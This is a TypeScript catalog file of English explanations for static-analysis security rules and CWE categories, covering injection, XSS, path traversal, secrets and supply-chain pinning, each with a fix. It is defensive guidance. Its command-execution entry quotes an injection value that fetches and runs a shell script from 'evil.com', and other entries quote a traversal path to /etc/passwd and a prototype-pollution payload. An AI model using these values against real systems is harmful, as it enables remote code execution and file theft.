// ============================================================
// Catalog in ENGLISH. See lib/catalog/index.ts for how it is queried.
// Mirrors lib/catalog/pt-BR.ts — the keys must stay in sync.
// ============================================================
import type { Entry } from "./types";

export const RULES: Record<string, Entry> = {
  "avoid-pickle": {
    title: "Deserialization with pickle",
    whatItIs: "Use of `pickle` to deserialize data.",
    whyItMatters:
      "`pickle` executes code while deserializing: a crafted payload becomes remote execution inside the Python process.",
    attackScenario:
      "A pickle object with `__reduce__` triggers `os.system` when loaded.",
    howToFix:
      "Use `json` for data. If you need binary, prefer formats without execution (msgpack, protobuf) and validate the schema.",
  },
  "dangerous-subprocess-use": {
    title: "Subprocess through a shell",
    whatItIs: "Subprocess call with `shell=True` or an assembled string.",
    whyItMatters:
      "The shell interprets `;`, `|` and `&&` — any external input becomes arbitrary command execution.",
    howToFix:
      "Pass the argument list and keep `shell=False` (the default). Validate input against an allowlist.",
  },
  "dangerous-system-call": {
    title: "Direct system call",
    whatItIs: "Use of `os.system` / `popen` with a string.",
    whyItMatters:
      "It always goes through the shell, so concatenating input is direct command injection.",
    howToFix: "Switch to `subprocess.run` with an argument list.",
  },
  "sqlalchemy-execute-raw-query": {
    title: "Raw SQL in SQLAlchemy",
    whatItIs: "SQL query built by concatenation or f-string.",
    whyItMatters:
      "This is SQL injection: the attacker alters the query and reaches other users' data.",
    howToFix:
      "Use `text()` with named parameters (`:id`) or the ORM query API.",
  },
  "flask-wtf-missing-csrf-protection": {
    title: "Flask without CSRF protection",
    whatItIs: "Flask application without CSRFProtect configured.",
    whyItMatters:
      "Without a token, another site can trigger authenticated actions in the victim's browser.",
    howToFix: "Enable `CSRFProtect(app)` and include the token in forms.",
  },
  "django-secret-key": {
    title: "SECRET_KEY in the code",
    whatItIs: "Django's SECRET_KEY is hardcoded.",
    whyItMatters:
      "With it, sessions and signed tokens can be forged — equivalent to becoming any user.",
    howToFix:
      "Move it to an environment variable and ROTATE the exposed key (current sessions drop, which is expected).",
  },
  "math-random-used": {
    title: "Non-cryptographic randomness",
    whatItIs: "Use of a regular pseudo-random generator for a security value.",
    whyItMatters:
      "`Math.random`/`random` are predictable: a session or recovery token generated this way can be guessed.",
    howToFix:
      "Use `crypto.randomUUID()`/`crypto.getRandomValues` (JS) or `secrets` (Python).",
  },
  "jwt-python-none-algorithm": {
    title: "JWT accepting the none algorithm",
    whatItIs: "JWT verification that accepts the `none` algorithm.",
    whyItMatters:
      "The attacker strips the signature and forges any token content, including the admin role.",
    howToFix:
      "Pin the accepted algorithms (`algorithms=[\"RS256\"]`) and never trust the token header.",
  },
  "jwt-hardcode": {
    title: "JWT secret in the code",
    whatItIs: "The JWT signing key is in the source.",
    whyItMatters: "Anyone reading the repository can sign valid tokens for any user.",
    howToFix: "Move it to an environment variable and rotate the exposed key.",
  },
  "gorilla-csrf-not-configured": {
    title: "Go: CSRF not configured",
    whatItIs: "Go server without CSRF middleware on state-changing routes.",
    whyItMatters:
      "Another site can trigger authenticated actions using the victim's cookie.",
    howToFix: "Apply the CSRF middleware and validate the token on mutating routes.",
  },
  "formatted-sql-query": {
    title: "SQL built by formatting",
    whatItIs: "SQL query built with string formatting.",
    whyItMatters: "The classic SQL injection path, regardless of language.",
    howToFix: "Use driver parameters; never interpolate a value into the string.",
  },
  "insecure-cipher-algorithm": {
    title: "Insecure cipher",
    whatItIs: "Use of a broken cipher algorithm (DES, RC4, ECB).",
    whyItMatters:
      "The data is recoverable in practice — the encryption gives a false sense of protection.",
    howToFix: "Use AES-GCM (or ChaCha20-Poly1305) with a random IV per message.",
  },
  "insecure-hash-function": {
    title: "Insecure hash",
    whatItIs: "Use of MD5 or SHA-1.",
    whyItMatters:
      "They are collision-vulnerable; for passwords they are also far too fast and fall to dictionary attacks.",
    howToFix: "SHA-256+ for integrity; Argon2id or bcrypt for passwords.",
  },
  "tainted-sql-string": {
    title: "SQL with untrusted input",
    whatItIs: "External input reaches the construction of a SQL query.",
    whyItMatters: "SQL injection with an attack path already traced by the tool.",
    howToFix: "Parameterize the query and validate the input type.",
  },
  "ssrf-requests": {
    title: "Request to an untrusted URL",
    whatItIs: "The destination URL comes from external input.",
    whyItMatters:
      "The server fetches whatever the attacker points to, including internal services and cloud metadata (169.254.169.254).",
    howToFix:
      "Validate against a domain allowlist and block private ranges, including after redirects.",
  },
  "missing-integrity": {
    title: "External script without integrity",
    whatItIs: "External `<script>`/`<link>` tag without an `integrity` attribute.",
    whyItMatters:
      "If the CDN is compromised, the altered script runs on your page with full access to the session.",
    howToFix: "Add `integrity` with the hash and `crossorigin=\"anonymous\"`.",
  },
  "detect-child-process": {
    title: "OS command execution",
    whatItIs: "The code runs operating-system commands from within the program.",
    whyItMatters:
      "If any part of the command comes from user input, an attacker chains their own commands and ends up running code on the server with the application's privileges.",
    attackScenario:
      "A value like `file.txt; curl evil.com/shell | sh` turns a harmless command into remote execution.",
    howToFix:
      "Replace `exec`/`execSync` with `execFile`/`spawn` passing arguments as an ARRAY (the shell no longer interprets the string) and validate input against an allowlist.",
  },
  "detect-non-literal-fs-filename": {
    title: "Dynamically built file path",
    whatItIs: "A file path is assembled at runtime instead of being fixed in code.",
    whyItMatters:
      "If the path accepts `../`, an attacker escapes the intended directory and reads or writes arbitrary server files — including `.env` and private keys.",
    attackScenario:
      "Requesting `../../../../etc/passwd` in a parameter that becomes a filename.",
    howToFix:
      "Normalize with `path.resolve` and confirm the result stays inside the allowed directory before opening. Better still: accept an identifier and map it to the path server-side.",
  },
  "path-join-resolve-traversal": {
    title: "Path traversal via path.join",
    whatItIs:
      "An externally supplied path is concatenated with a base directory via `path.join`/`resolve`.",
    whyItMatters:
      "`path.join` silently resolves `..`, so the result can point outside the intended directory.",
    attackScenario: "`path.join('/uploads', '../../etc/shadow')` yields `/etc/shadow`.",
    howToFix:
      "After resolving, check `resolved.startsWith(baseDir + path.sep)` and reject anything that escapes the base.",
  },
  "detect-non-literal-require": {
    title: "Module loaded by dynamic name",
    whatItIs: "A module is loaded from a name computed at runtime.",
    whyItMatters:
      "If the name has any external influence, an attacker loads an arbitrary module from disk and executes its code.",
    howToFix:
      "Use a fixed map of allowed module names instead of building the path dynamically.",
  },
  "detect-non-literal-regexp": {
    title: "Regular expression built at runtime",
    whatItIs: "A regular expression is built from a dynamic value.",
    whyItMatters:
      "Beyond runtime syntax errors, an externally supplied pattern can cause catastrophic backtracking (ReDoS) and hang the whole process with a single request.",
    howToFix:
      "Use fixed patterns. If you must interpolate, escape metacharacters and cap the input length.",
  },
  "detect-redos": {
    title: "Regex vulnerable to ReDoS",
    whatItIs: "The regular expression has a pattern prone to catastrophic backtracking.",
    whyItMatters:
      "A relatively short input makes the regex engine explore an exponential number of paths, blocking the event loop and taking the service down.",
    attackScenario:
      "A field with dozens of repeated characters pins the CPU at 100% for minutes.",
    howToFix:
      "Rewrite the pattern removing nested quantifiers (`(a+)+`), or switch to non-regex parsing. Cap input length before applying it.",
  },
  "prototype-pollution-assignment": {
    title: "Prototype pollution via assignment",
    whatItIs: "An assignment uses a dynamic key, allowing writes to `__proto__`.",
    whyItMatters:
      "Polluting the prototype affects EVERY object in the process: it lets an attacker forge authorization properties and change library behaviour.",
    attackScenario:
      'JSON containing `{"__proto__": {"isAdmin": true}}` makes any object report `isAdmin`.',
    howToFix:
      "Reject the keys `__proto__`, `constructor` and `prototype`, or use `Map`/`Object.create(null)` for external data.",
  },
  "prototype-pollution-loop": {
    title: "Prototype pollution in recursive copy",
    whatItIs: "A recursive object copy with no guard against `__proto__`.",
    whyItMatters: "This is the classic prototype-pollution vector in merge/clone helpers.",
    howToFix:
      "Skip the dangerous keys in the loop, or use `structuredClone`/a library that already handles it.",
  },
  "insecure-innerhtml": {
    title: "HTML injected into the DOM unsanitized",
    whatItIs: "HTML is inserted into the page by assigning directly to the DOM.",
    whyItMatters:
      "Any unsanitized content becomes a script running in the victim's browser with access to their session (XSS).",
    howToFix:
      "Use `textContent` for text. If you need HTML, sanitize it with a dedicated library (DOMPurify) before inserting.",
  },
  "react-dangerouslysetinnerhtml": {
    title: "dangerouslySetInnerHTML without sanitization",
    whatItIs: "Use of `dangerouslySetInnerHTML` in React.",
    whyItMatters:
      "This attribute disables React's automatic XSS protection — the content is inserted raw.",
    howToFix: "Render as text whenever possible; if HTML is required, sanitize it first.",
  },
  "raw-html-format": {
    title: "HTML built by string concatenation",
    whatItIs: "HTML assembled by concatenating strings.",
    whyItMatters:
      "Interpolating an unescaped value inside HTML is the most common source of reflected and stored XSS.",
    howToFix:
      "Use the framework's templating (which escapes by default) or explicitly escape every interpolated value.",
  },
  "jquery-insecure-selector": {
    title: "jQuery selector with a dynamic value",
    whatItIs: "A jQuery selector is built with a dynamic value.",
    whyItMatters:
      "jQuery treats selectors starting with `<` as HTML — the value becomes an executable element in the DOM.",
    howToFix:
      "Use `document.querySelector` with a fixed selector, or `$(document).find(value)` after validating.",
  },
  "unsafe-dynamic-method": {
    title: "Method invoked by dynamic name",
    whatItIs: "A method is invoked through a name computed at runtime.",
    whyItMatters:
      "If the name can be influenced externally, an attacker calls unintended methods on the object (including inherited prototype ones).",
    howToFix: "Use an explicit name → function map and reject anything not in it.",
  },
  "js-open-redirect-from-function": {
    title: "Open redirect",
    whatItIs: "A redirect uses a destination coming from outside.",
    whyItMatters:
      "The attacker uses your domain as a springboard for a phishing page — the link looks legitimate because it starts on your site.",
    howToFix:
      "Accept only relative paths, or validate the destination against an allowlist of domains.",
  },
  "bypass-tls-verification": {
    title: "TLS certificate verification disabled",
    whatItIs: "TLS certificate verification is turned off.",
    whyItMatters:
      "Without validating the certificate, any network intermediary reads and alters the traffic — encryption stops protecting against an active attacker.",
    howToFix:
      "Remove `rejectUnauthorized: false` / `verify=False`. For an internal certificate, install the CA in the trust store instead of disabling the check.",
  },
  "third-party-action-not-pinned-to-commit-sha": {
    title: "Third-party GitHub Action not pinned",
    whatItIs:
      "A third-party GitHub Action is referenced by tag (`@v3`) instead of a commit SHA.",
    whyItMatters:
      "Tags are movable: whoever controls the action's repository can repoint `v3` to malicious code, which then runs in your CI with access to pipeline secrets.",
    attackScenario:
      "The maintainer's account is compromised, the tag is repointed, and the next build exfiltrates the deploy credentials.",
    howToFix:
      "Pin to the full commit SHA (`uses: owner/action@<sha40>`) and update deliberately, for example with Dependabot.",
  },
  "dockerfile-source-not-pinned": {
    title: "Docker base image not pinned",
    whatItIs: "The Dockerfile base image is not pinned.",
    whyItMatters:
      "Builds stop being reproducible and a modified base image enters your environment without review.",
    howToFix: "Pin by digest (`FROM image@sha256:...`) or at least by exact version.",
  },
  "package-dependencies-check": {
    title: "Dependencies with unpinned versions",
    whatItIs:
      "The dependency declaration allows floating versions (ranges such as `^` or `*`).",
    whyItMatters:
      "A version published with malicious code lands on the next install with nobody reviewing it — the most common npm supply-chain attack vector.",
    howToFix:
      "Pin the versions and commit the lockfile. Use `npm ci` in CI, which installs exactly what the lock says.",
  },
  "generic-api-key": {
    title: "API key in the code",
    whatItIs: "What looks like an API key is written in the source.",
    whyItMatters:
      "A secret in the repository leaks to everyone with clone access — and stays in git history even after removal.",
    howToFix:
      "Move it to an environment variable, REVOKE the exposed key (treat it as compromised) and scrub history if the repo is public.",
  },
  "detected-generic-secret": {
    title: "Secret in the code",
    whatItIs: "A value that looks like a secret is in the source.",
    whyItMatters:
      "Credentials in a repository are the most exploited finding by automated scanners — bots find public keys within minutes.",
    howToFix: "Move it to an environment variable and revoke the exposed value.",
  },
  "private-key": {
    title: "Private key committed",
    whatItIs: "A private key is committed to the repository.",
    whyItMatters:
      "Whoever holds the key assumes the service's identity: signs tokens, decrypts traffic or accesses servers.",
    howToFix:
      "Remove it, GENERATE A NEW PAIR and distribute the key through a secrets manager. Treat the old key as compromised.",
  },
  "unsafe-formatstring": {
    title: "Dynamic format string",
    whatItIs: "A format string is built dynamically.",
    whyItMatters:
      "Depending on the language, this allows reading memory or triggering unhandled errors.",
    howToFix: "Use a fixed format string and pass values as arguments.",
  },
  "eqeq-is-bad": {
    title: "Loose equality (==) instead of strict",
    whatItIs: "Comparison with `==` instead of `===`.",
    whyItMatters:
      "JavaScript's type coercion creates surprising equalities (`0 == '0'`, `'' == false`), which in a permission check becomes an authorization flaw.",
    howToFix: "Use `===`/`!==` and convert types explicitly.",
  },
  "useless-assignment": {
    title: "Assignment never used",
    whatItIs: "A variable receives a value that is never used.",
    whyItMatters:
      "Not a security flaw in itself, but it usually signals incomplete logic — including validation that was written and never applied.",
    howToFix: "Remove the assignment, or use the value if the intent was to validate it.",
  },
};

export const CWES: Record<string, Entry> = {
  "CWE-78": {
    title: "OS command injection",
    whatItIs: "Operating-system command injection.",
    whyItMatters:
      "Untrusted input reaches a command interpreter and the attacker runs whatever they want on the server.",
    howToFix:
      "Execute with arguments as an array (no shell) and validate input against an allowlist.",
  },
  "CWE-79": {
    title: "Cross-site scripting (XSS)",
    whatItIs: "Cross-site scripting (XSS).",
    whyItMatters:
      "Attacker-controlled script runs in the victim's browser with their session — enough to steal tokens and act as the user.",
    howToFix:
      "Escape output according to context (HTML, attribute, JS) and sanitize any accepted HTML.",
  },
  "CWE-89": {
    title: "SQL injection",
    whatItIs: "SQL injection.",
    whyItMatters:
      "The attacker alters the query and reads, changes or deletes data they should never reach — often the whole database.",
    howToFix:
      "Use parameterized queries (driver placeholders). Never concatenate input into the SQL string.",
  },
  "CWE-22": {
    title: "Path traversal",
    whatItIs: "Directory traversal (path traversal).",
    whyItMatters:
      "Allows reading or writing files outside the intended directory, including configuration and secrets.",
    howToFix: "Normalize the path and confirm it stays inside the base directory.",
  },
  "CWE-94": {
    title: "Code injection",
    whatItIs: "Code injection.",
    whyItMatters: "Untrusted input is interpreted as the program's own code.",
    howToFix: "Drop `eval`/`Function`; use data structures instead of generated code.",
  },
  "CWE-502": {
    title: "Insecure deserialization",
    whatItIs: "Insecure deserialization.",
    whyItMatters:
      "Objects coming from outside can trigger code execution while being reconstructed.",
    howToFix:
      "Deserialize only pure data formats (JSON) and validate the schema before use.",
  },
  "CWE-611": {
    title: "XML external entities (XXE)",
    whatItIs: "XML processing with external entities (XXE).",
    whyItMatters:
      "Allows reading local files and reaching internal services from the parser.",
    howToFix: "Disable external entities and DTD in the XML parser.",
  },
  "CWE-918": {
    title: "Server-Side Request Forgery (SSRF)",
    whatItIs: "Server-Side Request Forgery (SSRF).",
    whyItMatters:
      "The server makes requests wherever the attacker points, reaching internal services and cloud metadata.",
    howToFix:
      "Restrict destinations to an allowlist of domains and block private IP ranges, including after redirects.",
  },
  "CWE-798": {
    title: "Hardcoded credential",
    whatItIs: "Credential embedded in the code.",
    whyItMatters:
      "Anyone reading the code — or the git history — gains direct access to the protected resource.",
    howToFix: "Move it to an environment variable and revoke the exposed value.",
  },
  "CWE-327": {
    title: "Weak or obsolete cryptography",
    whatItIs: "Weak or obsolete cryptographic algorithm.",
    whyItMatters:
      "Broken algorithms (MD5, SHA-1, DES) do not provide the protection the architecture assumes.",
    howToFix:
      "Use AES-GCM for encryption, SHA-256+ for data hashing and Argon2/bcrypt for passwords.",
  },
  "CWE-601": {
    title: "Open redirect",
    whatItIs: "Open redirect.",
    whyItMatters: "Your domain lends credibility to a phishing link.",
    howToFix: "Accept only relative paths or destinations from an allowlist.",
  },
  "CWE-1321": {
    title: "Prototype pollution",
    whatItIs: "Prototype pollution.",
    whyItMatters:
      "Changes the behaviour of every object in the process, including permission checks.",
    howToFix: "Reject `__proto__`/`constructor`/`prototype` in external data.",
  },
  "CWE-1333": {
    title: "Exponential-complexity regex (ReDoS)",
    whatItIs: "Regular expression with exponential complexity (ReDoS).",
    whyItMatters: "A small request consumes CPU indefinitely and takes the service down.",
    howToFix: "Rewrite the pattern and cap the input length.",
  },
  "CWE-1357": {
    title: "Insufficiently trustworthy component",
    whatItIs: "Reliance on an insufficiently trustworthy third-party component.",
    whyItMatters:
      "Third-party code runs with the same privileges as yours — if it changes, you execute the change.",
    howToFix: "Pin the version by digest/SHA and review updates.",
  },
};
